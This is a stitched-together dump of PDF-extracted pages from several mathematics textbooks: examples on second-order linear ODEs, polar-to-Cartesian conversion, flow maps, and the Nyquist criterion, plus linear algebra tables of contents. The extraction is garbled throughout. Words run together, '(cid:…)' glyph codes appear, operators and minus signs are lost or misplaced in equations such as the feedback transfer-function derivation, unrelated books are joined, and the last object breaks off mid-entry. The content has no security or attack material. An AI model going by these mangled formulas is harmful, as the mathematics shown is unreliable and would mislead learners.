    "Page_15": "4.3 TheNonhomogeneousScalarEquationofOrdern 61\n1 0.5\n0.9 0.4\n0.8 0.3\n0.7 0.2\n0.6 0.1\n0.5 0\n0.4 \u22120.1\n0.3 \u22120.2\n0.2 \u22120.3\n0.1 \u22120.4\n0 \u22120.5\n0 5 10 15 0 5 10 15\nFig.4.2 Examples4.3and4.4:steadystatesolutionandtransient\nExample4.3 Thelinearequationoforder2ingeneralform\ny\u2032\u2032+ay\u2032+by =g(t) (4.17)\nconstitutesamodelforalargevarietyofphysicalproblems,anditisappropriateto\nillustratethetransientandthesteadystatephenomena.Tothisend,weassumethat\nthecharacteristicpolynomialoftheassociatedhomogeneousequationhasapairof\ncomplexconjugateroots\u03b1\u00b1i\u03b2with\u03b1=\u2212a/2<0and\u03b2 (cid:6)=0(whichnecessarily\nyieldsb(cid:6)=0).\nIf the forcing term is constant, say g(t)=g , the unique constant solution is\n0\n\u03c7\u2217(t)=g /b. Its graph is drawn in Fig. 4.2 (left), for the case a =1, b=6,\n0\ng =3. The figure shows also the graph of a solution corresponding to different\n0\ninitialconditions.Thetransientstagecanberecognizedintheintervalwherethetwo\ngraphscanbeclearlydistinguished. (cid:2)\nExample4.4 Consideredagainthegeneralsecondorderequation(4.17)underthe\nsameassumptionsaboutthecoefficientsa,b,butnowwithaperiodicforcingterm\ng(t)= p cos\u03c9t + p sin\u03c9t, p ,p \u2208R.\n1 2 1 2\nBythesameprocedureofExample4.1,wecanfindaparticularsolutionofthe\nform\n\u03c7\u2217(t)=q cos\u03c9t +q sin\u03c9t, q ,q \u2208R (4.18)\n1 2 1 2\nwhich can be recognized as the steady state solution. The general integral can be\nwrittenas\ny(t)=(c cos\u03b2t +c sin\u03b2t)e\u03b1t +q cos\u03c9t +q sin\u03c9t. (4.19)\n1 2 1 2",
    "Page_16": "8.1. PolarCoordinatesand PolarGraphs 441\nExample8.2:Finding CartesianCoordinates\nThepolarcoordinatesofapointintheplaneare( 5,\u03c0/6).FindtheCartesiancoordinates.\n\u2212\nSolution. Forthepointspecified by thepolarcoordinates( 5,\u03c0/6), r= 5, and x\u03b8=\u03c0/6. From 8.1\n\u2212 \u2212\n\u03c0 5\nx=rcos(\u03b8)= 5cos = \u221a3\n\u2212 6 \u22122\n(cid:16) (cid:17)\n\u03c0 5\ny=rsin(\u03b8)= 5sin =\n\u2212 6 \u22122\n(cid:16) (cid:17)\nThustheCartesian coordinatesare 5\u221a3, 5 . Thepointis shownin thefollowinggraph.\n\u22122 \u22122\n(cid:0) (cid:1)\n( 5\u221a3, 5)\n\u22122 \u22122\nRecall from the previous example that for the point specified by (5,\u03c0/6), the Cartesian coordinates\nare 5\u221a3,5 . Noticethatinthisexample,bymultiplyingr by 1, theresultingCartesian coordinatesare\n2 2 \u2212\nalsomultipliedby 1.\n(cid:0) (cid:1) \u2212 \u2660\nThe following picture exhibits both points in the above two examples to emphasize how they are just\non oppositesidesof(0,0)butat thesamedistancefrom(0,0).\n(5\u221a3,5)\n2 2\n( 5\u221a3, 5)\n\u22122 \u22122\nIn thenexttwoexamples,welookat howtoconvertCartesian coordinatestopolarcoordinates.\nExample8.3:Finding PolarCoordinates\nSupposetheCartesiancoordinatesofapointare(3,4). Findapairofpolarcoordinateswhich\ncorrespondtothispoint.\nwww.dbooks.org",
    "Page_17": "166 AppendixA:InternalStabilityNotions\nA.1 TheFlowMap\nAsolutionof(A.1)canberegardedasaparameterizedcurve x =\u03d5(t)ofRn.For\neacht \u2208R,thetangentvectortosuchacurveatthepointxcoincideswith f(x).For\nthis reason, the function f :Rn \u2192Rn which defines (A.1) is also called a vector\nfield.\nTheimageofasolutionx =\u03d5(t)of(A.1)iscalledanorbitoratrajectory.Itis\nimportantdonotconfusethegraphofasolution\u03d5(t),whichisasubsetofR\u00d7Rn,\nwiththeorbitof\u03d5(t),whichcoincideswiththeset\u03d5(R)anditisasubsetofRn.We\nmayalsoviewtheorbitof\u03d5astheorthogonalprojectionofthegraphof\u03d5onRn,\nalongthetimeaxis(seeFig.A.1).\nWealreadymentionedthatunderthestatedassumptions,foreachinitialcondi-\ntion (A.1) has a unique solution. In order to emphasize its global validity, we my\nreformulate this property writing that if x =\u03d5(t) and x =\u03c8(t) are two arbitrary\nsolutionsof(A.1),then\n\u2203t\u00af: \u03d5(t\u00af)=\u03c8(t\u00af) =\u21d2 \u03d5(t)=\u03c8(t) \u2200t \u2208R. (A.2)\nThe geometric interpretation of (A.2) is that if the graphs of the two solutions\nhave a common point, then they must coincide. We may also interpret the time\ninvariance property from a geometrical point of view: the time translation of the\ngraph of a solution is again the graph of a (in general, different) solution. All the\nsolutions obtained as time translation of a fixed solution obviously are equivalent\nparametrization of the same curve, and so they define the same orbit (see again\nFig.A.1).Thisfactadmitsaconverse.\nFig.A.1 Twosolutionsand\ntheirprojections\n10\ny\n5\n0\nt\n\u22125\n\u221210\n10 x\n5\n20\n0\n15\n\u22125 10\n5\n\u221210 0\nwww.dbooks.org",
    "Page_18": "156 8 FrequencyDomainApproach\nFig.8.1 Thecurve\u03b4of 0.8\nExample8.5\n0.6\n0.4\n0.2\n0\n\u22120.2\n\u22120.4\n\u22120.6\n\u22120.8\n\u22120.8 \u22120.6 \u22120.4 \u22120.2 0 0.2 0.4 0.6 0.8\nFig.8.2 Thecurve\u03b4of\nExample8.6 1\n0.8\n0.6\n0.4\n0.2\n0\n\u22120.2\n\u22120.4\n\u22120.6\n\u22120.8\n\u22121\n\u22121 \u22120.8 \u22120.6 \u22120.4 \u22120.2 0 0.2 0.4 0.6 0.8 1\nfollowing, classical result from the theory of functions of a complex variable (see\nforinstance[1]).\nArgument principle Let Q be the integer number denoting how many times the\ncurve\u03b4(t)encirclestheoriginincounterclockwisesense,whilethecontourof\u0393 is\nrunonceinthecounterclockwisesense.Then, Q Z P.\n= \u2212\nDefinition8.4 TheNyquistdiagramofaproperrationalfunctionT(s)istheimage\nofthecurvew T(\u03b3(t)) \u03b4(t),when\u03b3(t) it (t R).\n= = =\u2212 \u2208\nThecurve\u03b3(t) itgeneratingtheNyquistdiagramisnotclosed.Nevertheless,\n=\u2212\ntheimage\u03b4of\u03b3obtainedbycompositionwithT,surroundsaboundedregionofthe\ncomplexplane.Indeed,sinceT isproper,wehave\nwww.dbooks.org",
    "Page_19": "8.4 SISOSystems 157\nlim \u03b4(t) 0.\nt =\n\u2192\u00b1\u221e\nInfact,wemayalsothinkof\u03b3(t)asaclosedcurve,byaddingtoitsdomainthe\ninfinitypoint:completedinthisway,wemayimaginethat\u03b3surroundstherighthalf\nplane of C (the contour being run in the counterclockwise sense). Notice that by\nconstruction,\u03b4(t) (ReT( it),ImT( it)).\n= \u2212 \u2212\nLet T(s) be a proper rational function without zeros or poles on the imaginary\naxis.DrawingtheNyquistdiagramandassumingthatZisknown,wecannoweasily\ncheckwhethertherighthalfplaneofCcontainssomepolesofT(s).\nBy some suitable modifications, these conclusions can be extended to the case\nwhereT(s)possessespurelyimaginarypolesorzeros.\n8.4.4 Stabilization byStaticOutputFeedback\nContinuing to deal with a SISO system of the form (8.1) satisfying the complete\ncontrollabilityandthecompleteobservabilityassumption,inthissectionweshow\nhowtotakeadvantagesoftheNyquistcriterioninordertodetermineastaticoutput\nfeedback which stabilizes the given system in the BIBO (and hence also in the\ninternal)sense.\nAsusual,wedenotebyu Rtheinputvariableandbyy Rtheoutputvariable.\n\u2208 \u2208\nFirst,weexaminehowthetransferfunctionchanges,whenafeedbackoftheform\nkyisaddedtotheexternalinputu:here,kisapositiveconstant,sometimescalled\n\u2212\nthegain;thechoiceoftheminussignisconventional.\nLetT(s)bethetransferfunctionofthegivensystem.Letv u ky.Bytheaid\n= \u2212\nofthefigureabove,weeasilyseethat\nY(s) T(s)V(s) T(s)(U(s) kY(s))\n= = \u2212\nsothat\nY(s) kT(s)Y(s) T(s)U(S).\n+ =\nAsaconsequence,foreachs C suchthat1 kT(s) 0,\n\u2208 + (cid:5)=\nT(s) 1 T(s)\nY(s) G(s)U(s) U(s) U(s)\n= = 1 kT(s) = k \u00b7 1 T(s)\n+ k +"
}


{
    "Page_9": "Contents\nContents iii\nPreface 1\n1 Systems ofEquations 3\n1.1 SystemsofEquations,Geometry . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n1.2 SystemsOfEquations,AlgebraicProcedures . . . . . . . . . . . . . . . . . . . . . . . . 7\n1.2.1 Elementary Operations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n1.2.2 Gaussian Elimination . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n1.2.3 UniquenessoftheReduced Row-EchelonForm . . . . . . . . . . . . . . . . . . 25\n1.2.4 Rank andHomogeneousSystems . . . . . . . . . . . . . . . . . . . . . . . . . . 28\n1.2.5 Balancing Chemical Reactions . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33\n1.2.6 DimensionlessVariables . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35\n1.2.7 An Applicationto ResistorNetworks . . . . . . . . . . . . . . . . . . . . . . . . 38\n2 Matrices 53\n2.1 MatrixArithmetic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53\n2.1.1 AdditionofMatrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55\n2.1.2 Scalar MultiplicationofMatrices . . . . . . . . . . . . . . . . . . . . . . . . . . 57\n2.1.3 MultiplicationofMatrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\n2.1.4 Theijth Entry ofaProduct . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64\n2.1.5 Properties ofMatrixMultiplication . . . . . . . . . . . . . . . . . . . . . . . . . 67\n2.1.6 TheTranspose . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 68\n2.1.7 TheIdentityand Inverses . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71\n2.1.8 FindingtheInverseofa Matrix . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73\n2.1.9 Elementary Matrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79\n2.1.10 Moreon MatrixInverses . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 87\n2.2 LU Factorization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 99\n2.2.1 FindingAn LU FactorizationBy Inspection . . . . . . . . . . . . . . . . . . . . . 99\n2.2.2 LU Factorization,MultiplierMethod . . . . . . . . . . . . . . . . . . . . . . . . 100\n2.2.3 SolvingSystemsusingLU Factorization . . . . . . . . . . . . . . . . . . . . . . . 101\n2.2.4 JustificationfortheMultiplierMethod . . . . . . . . . . . . . . . . . . . . . . . . 102\niii\nwww.dbooks.org",
    "Page_10": "iv CONTENTS\n3 Determinants 107\n3.1 BasicTechniquesand Properties . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107\n3.1.1 Cofactors and2 2 Determinants . . . . . . . . . . . . . . . . . . . . . . . . . . 107\n\u00d7\n3.1.2 TheDeterminantofaTriangularMatrix . . . . . . . . . . . . . . . . . . . . . . . 112\n3.1.3 Properties ofDeterminantsI: Examples . . . . . . . . . . . . . . . . . . . . . . . 114\n3.1.4 Properties ofDeterminantsII: SomeImportantProofs . . . . . . . . . . . . . . . 118\n3.1.5 FindingDeterminantsusingRowOperations . . . . . . . . . . . . . . . . . . . . 123\n3.2 ApplicationsoftheDeterminant . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130\n3.2.1 A FormulafortheInverse . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130\n3.2.2 Cramer\u2019s Rule . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 135\n3.2.3 PolynomialInterpolation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 138\n4 Rn 145\n4.1 Vectorsin Rn . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 145\n4.2 Algebrain Rn . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\n4.2.1 AdditionofVectors in Rn . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\n4.2.2 Scalar MultiplicationofVectors inRn . . . . . . . . . . . . . . . . . . . . . . . . 150\n4.3 GeometricMeaningofVectorAddition . . . . . . . . . . . . . . . . . . . . . . . . . . . 152\n4.4 LengthofaVector . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 155\n4.5 GeometricMeaningofScalar Multiplication . . . . . . . . . . . . . . . . . . . . . . . . . 159\n4.6 ParametricLines . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 161\n4.7 TheDot Product . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 166\n4.7.1 TheDot Product . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 167\n4.7.2 TheGeometricSignificanceoftheDotProduct . . . . . . . . . . . . . . . . . . . 170\n4.7.3 Projections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 173\n4.8 Planes inRn . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 179\n4.9 TheCross Product . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 182\n4.9.1 TheBox Product . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188\n4.10 Spanning,LinearIndependenceand Basisin Rn . . . . . . . . . . . . . . . . . . . . . . . 192\n4.10.1 Spanning Set ofVectors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 192\n4.10.2 Linearly IndependentSet ofVectors . . . . . . . . . . . . . . . . . . . . . . . . . 194\n4.10.3 A Short Applicationto Chemistry . . . . . . . . . . . . . . . . . . . . . . . . . . 200\n4.10.4 Subspaces and Basis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\n4.10.5 Row Space, ColumnSpace, and NullSpace ofaMatrix . . . . . . . . . . . . . . . 211\n4.11 Orthogonalityand theGram SchmidtProcess . . . . . . . . . . . . . . . . . . . . . . . . 232\n4.11.1 Orthogonaland OrthonormalSets . . . . . . . . . . . . . . . . . . . . . . . . . . 233\n4.11.2 OrthogonalMatrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 238",
    "Page_11": "CONTENTS v\n4.11.3 Gram-SchmidtProcess . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 241\n4.11.4 OrthogonalProjections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244\n4.11.5 Least Squares Approximation . . . . . . . . . . . . . . . . . . . . . . . . . . . . 251\n4.12 Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261\n4.12.1 Vectors and Physics. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261\n4.12.2 Work . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 264\n5 Linear Transformations 269\n5.1 LinearTransformations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 269\n5.2 TheMatrixofa LinearTransformationI . . . . . . . . . . . . . . . . . . . . . . . . . . . 272\n5.3 PropertiesofLinearTransformations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 281\n5.4 Special LinearTransformationsinR2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . 286\n5.5 Oneto Oneand OntoTransformations . . . . . . . . . . . . . . . . . . . . . . . . . . . . 292\n5.6 Isomorphisms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 298\n5.7 TheKernel AndImageOfA LinearMap . . . . . . . . . . . . . . . . . . . . . . . . . . . 310\n5.8 TheMatrixofa LinearTransformationII . . . . . . . . . . . . . . . . . . . . . . . . . . 315\n5.9 TheGeneral SolutionofaLinearSystem . . . . . . . . . . . . . . . . . . . . . . . . . . . 321\n6 Complex Numbers 329\n6.1 ComplexNumbers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 329\n6.2 PolarForm . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 336\n6.3 RootsofComplexNumbers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 339\n6.4 TheQuadraticFormula . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343\n7 Spectral Theory 347\n7.1 Eigenvaluesand EigenvectorsofaMatrix . . . . . . . . . . . . . . . . . . . . . . . . . . 347\n7.1.1 DefinitionofEigenvectorsand Eigenvalues . . . . . . . . . . . . . . . . . . . . . 347\n7.1.2 FindingEigenvectorsand Eigenvalues . . . . . . . . . . . . . . . . . . . . . . . . 350\n7.1.3 Eigenvaluesand EigenvectorsforSpecial Types ofMatrices . . . . . . . . . . . . 356\n7.2 Diagonalization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 362\n7.2.1 Similarityand Diagonalization . . . . . . . . . . . . . . . . . . . . . . . . . . . . 362\n7.2.2 DiagonalizingaMatrix . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 364\n7.2.3 ComplexEigenvalues . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 369\n7.3 ApplicationsofSpectral Theory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 372\n7.3.1 Raising aMatrixtoa HighPower . . . . . . . . . . . . . . . . . . . . . . . . . . 373\n7.3.2 Raising aSymmetricMatrixto aHighPower . . . . . . . . . . . . . . . . . . . . 375\n7.3.3 MarkovMatrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 378\n7.3.3.1 EigenvaluesofMarkovMatrices . . . . . . . . . . . . . . . . . . . . . 384\nwww.dbooks.org",
    "Page_12": "vi CONTENTS\n7.3.4 DynamicalSystems . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 384\n7.3.5 TheMatrixExponential . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 392\n7.4 Orthogonality . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 401\n7.4.1 OrthogonalDiagonalization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 401\n7.4.2 TheSingularValueDecomposition . . . . . . . . . . . . . . . . . . . . . . . . . 409\n7.4.3 PositiveDefiniteMatrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 417\n7.4.3.1 TheCholeskyFactorization . . . . . . . . . . . . . . . . . . . . . . . . 420\n7.4.4 QR Factorization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 422\n7.4.4.1 TheQRFactorization andEigenvalues . . . . . . . . . . . . . . . . . . 424\n7.4.4.2 PowerMethods . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 424\n7.4.5 QuadraticForms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 427\n8 Some CurvilinearCoordinateSystems 439\n8.1 PolarCoordinatesand PolarGraphs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 439\n8.2 Spherical and CylindricalCoordinates . . . . . . . . . . . . . . . . . . . . . . . . . . . . 449\n9 Vector Spaces 455\n9.1 AlgebraicConsiderations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 455\n9.2 SpanningSets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 471\n9.3 LinearIndependence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 475\n9.4 Subspaces andBasis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 483\n9.5 Sumsand Intersections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 498\n9.6 LinearTransformations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 499\n9.7 Isomorphisms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 505\n9.7.1 Oneto OneandOntoTransformations . . . . . . . . . . . . . . . . . . . . . . . . 505\n9.7.2 Isomorphisms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 509\n9.8 TheKernel AndImageOfA LinearMap . . . . . . . . . . . . . . . . . . . . . . . . . . . 518\n9.9 TheMatrixofa LinearTransformation . . . . . . . . . . . . . . . . . . . . . . . . . . . . 524\nA Some Prerequisite Topics 537\nA.1 Sets andSet Notation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 537\nA.2 WellOrdering and Induction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 539\nB Selected Exercise Answers 543\nIndex 591",
}

{
    "Page_7": "Contents\nChapter One: Linear Systems\nI Solving Linear Systems . . . . . . . . . . . . . . . . . . . . . . . . 1\nI.1 Gauss\u2019s Method . . . . . . . . . . . . . . . . . . . . . . . . . 2\nI.2 Describing the Solution Set . . . . . . . . . . . . . . . . . . . 13\nI.3 General=Particular+Homogeneous. . . . . . . . . . . . . . 23\nII Linear Geometry . . . . . . . . . . . . . . . . . . . . . . . . . . . 35\nII.1 Vectors in Space* . . . . . . . . . . . . . . . . . . . . . . . . 35\nII.2 Length and Angle Measures* . . . . . . . . . . . . . . . . . . 42\nIII Reduced Echelon Form . . . . . . . . . . . . . . . . . . . . . . . . 50\nIII.1 Gauss-Jordan Reduction . . . . . . . . . . . . . . . . . . . . . 50\nIII.2 The Linear Combination Lemma . . . . . . . . . . . . . . . . 56\nTopic: Computer Algebra Systems . . . . . . . . . . . . . . . . . . . 65\nTopic: Accuracy of Computations . . . . . . . . . . . . . . . . . . . . 67\nTopic: Analyzing Networks . . . . . . . . . . . . . . . . . . . . . . . . 71\nChapter Two: Vector Spaces\nI Definition of Vector Space . . . . . . . . . . . . . . . . . . . . . . 78\nI.1 Definition and Examples . . . . . . . . . . . . . . . . . . . . 78\nI.2 Subspaces and Spanning Sets . . . . . . . . . . . . . . . . . . 90\nII Linear Independence . . . . . . . . . . . . . . . . . . . . . . . . . 101\nII.1 Definition and Examples . . . . . . . . . . . . . . . . . . . . 101\nIII Basis and Dimension . . . . . . . . . . . . . . . . . . . . . . . . . 114\nIII.1 Basis. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\nIII.2 Dimension . . . . . . . . . . . . . . . . . . . . . . . . . . . . 121\nIII.3 Vector Spaces and Linear Systems . . . . . . . . . . . . . . . 127\nIII.4 Combining Subspaces*. . . . . . . . . . . . . . . . . . . . . . 135\nTopic: Fields. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\nwww.dbooks.org",
    "Page_8": "Topic: Crystals . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 146\nTopic: Voting Paradoxes . . . . . . . . . . . . . . . . . . . . . . . . . 150\nTopic: Dimensional Analysis . . . . . . . . . . . . . . . . . . . . . . . 156\nChapter Three: Maps Between Spaces\nI Isomorphisms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 165\nI.1 Definition and Examples . . . . . . . . . . . . . . . . . . . . 165\nI.2 Dimension Characterizes Isomorphism . . . . . . . . . . . . . 175\nII Homomorphisms . . . . . . . . . . . . . . . . . . . . . . . . . . . 183\nII.1 Definition . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183\nII.2 Range space and Null space . . . . . . . . . . . . . . . . . . . 191\nIII Computing Linear Maps . . . . . . . . . . . . . . . . . . . . . . . 204\nIII.1 Representing Linear Maps with Matrices . . . . . . . . . . . 204\nIII.2 Any Matrix Represents a Linear Map . . . . . . . . . . . . . 215\nIV Matrix Operations . . . . . . . . . . . . . . . . . . . . . . . . . . 224\nIV.1 Sums and Scalar Products . . . . . . . . . . . . . . . . . . . . 224\nIV.2 Matrix Multiplication . . . . . . . . . . . . . . . . . . . . . . 228\nIV.3 Mechanics of Matrix Multiplication . . . . . . . . . . . . . . 237\nIV.4 Inverses . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 246\nV Change of Basis . . . . . . . . . . . . . . . . . . . . . . . . . . . . 254\nV.1 Changing Representations of Vectors . . . . . . . . . . . . . . 254\nV.2 Changing Map Representations . . . . . . . . . . . . . . . . . 259\nVI Projection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 267\nVI.1 Orthogonal Projection Into a Line* . . . . . . . . . . . . . . 267\nVI.2 Gram-Schmidt Orthogonalization* . . . . . . . . . . . . . . . 272\nVI.3 Projection Into a Subspace* . . . . . . . . . . . . . . . . . . . 277\nTopic: Line of Best Fit . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nTopic: Geometry of Linear Maps . . . . . . . . . . . . . . . . . . . . 293\nTopic: Magic Squares . . . . . . . . . . . . . . . . . . . . . . . . . . . 300\nTopic: Markov Chains . . . . . . . . . . . . . . . . . . . . . . . . . . 305\nTopic: Orthonormal Matrices . . . . . . . . . . . . . . . . . . . . . . 311\nChapter Four: Determinants\nI Definition . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 318\nI.1 Exploration* . . . . . . . . . . . . . . . . . . . . . . . . . . . 318\nI.2 Properties of Determinants . . . . . . . . . . . . . . . . . . . 323\nI.3 The Permutation Expansion . . . . . . . . . . . . . . . . . . 328\nI.4 Determinants Exist* . . . . . . . . . . . . . . . . . . . . . . . 338\nII Geometry of Determinants . . . . . . . . . . . . . . . . . . . . . . 346\nII.1 Determinants as Size Functions . . . . . . . . . . . . . . . . . 346\nIII Laplace\u2019s Formula . . . . . . . . . . . . . . . . . . . . . . . . . . . 353",
    "Page_9": "III.1 Laplace\u2019s Expansion* . . . . . . . . . . . . . . . . . . . . . . 353\nTopic: Cramer\u2019s Rule . . . . . . . . . . . . . . . . . . . . . . . . . . . 359\nTopic: Speed of Calculating Determinants . . . . . . . . . . . . . . . 362\nTopic: Chi\u00f2\u2019s Method . . . . . . . . . . . . . . . . . . . . . . . . . . . 366\nTopic: Projective Geometry . . . . . . . . . . . . . . . . . . . . . . . 370\nChapter Five: Similarity\nI Complex Vector Spaces . . . . . . . . . . . . . . . . . . . . . . . . 383\nI.1 Polynomial Factoring and Complex Numbers* . . . . . . . . 384\nI.2 Complex Representations . . . . . . . . . . . . . . . . . . . . 386\nII Similarity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 388\nII.1 Definition and Examples . . . . . . . . . . . . . . . . . . . . 388\nII.2 Diagonalizability . . . . . . . . . . . . . . . . . . . . . . . . . 393\nII.3 Eigenvalues and Eigenvectors . . . . . . . . . . . . . . . . . . 397\nIII Nilpotence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 408\nIII.1 Self-Composition* . . . . . . . . . . . . . . . . . . . . . . . . 408\nIII.2 Strings* . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 412\nIV Jordan Form. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 423\nIV.1 Polynomials of Maps and Matrices* . . . . . . . . . . . . . . 423\nIV.2 Jordan Canonical Form*. . . . . . . . . . . . . . . . . . . . . 431\nTopic: Method of Powers . . . . . . . . . . . . . . . . . . . . . . . . . 446\nTopic: Stable Populations . . . . . . . . . . . . . . . . . . . . . . . . 450\nTopic: Page Ranking . . . . . . . . . . . . . . . . . . . . . . . . . . . 452\nTopic: Linear Recurrences . . . . . . . . . . . . . . . . . . . . . . . . 456\nTopic: Coupled Oscillators . . . . . . . . . . . . . . . . . . . . . . . . 464\nAppendix\nStatements . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . A-1\nQuantifiers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . A-2\nTechniques of Proof . . . . . . . . . . . . . . . . . . . . . . . . . . A-3\nSets, Functions, and Relations. . . . . . . . . . . . . . . . . . . . . A-5\n\u2217Starred subsections are optional.\nwww.dbooks.org",
}

{
    "Page_10": "iv CONTENTS\n4.2 Projectionsand Planes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 226\n4.3 Moreon theCross Product . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244\n4.4 LinearOperatorson R3 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 250\n4.5 AnApplicationtoComputerGraphics . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258\nSupplementary ExercisesforChapter4 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261\n5 Vector Space Rn 263\n5.1 Subspaces andSpanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263\n5.2 IndependenceandDimension . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 271\n5.3 Orthogonality . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 282\n5.4 Rank ofaMatrix . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 290\n5.5 Similarityand Diagonalization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 298\n5.6 Best Approximationand Least Squares . . . . . . . . . . . . . . . . . . . . . . . . . . . . 310\n5.7 AnApplicationtoCorrelation andVariance . . . . . . . . . . . . . . . . . . . . . . . . . 322\nSupplementary ExercisesforChapter5 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 327\n6 Vector Spaces 329\n6.1 Examplesand BasicProperties . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 329\n6.2 Subspaces andSpanning Sets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 338\n6.3 LinearIndependenceandDimension . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 345\n6.4 FiniteDimensionalSpaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 354\n6.5 AnApplicationtoPolynomials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 363\n6.6 AnApplicationtoDifferentialEquations . . . . . . . . . . . . . . . . . . . . . . . . . . . 368\nSupplementary 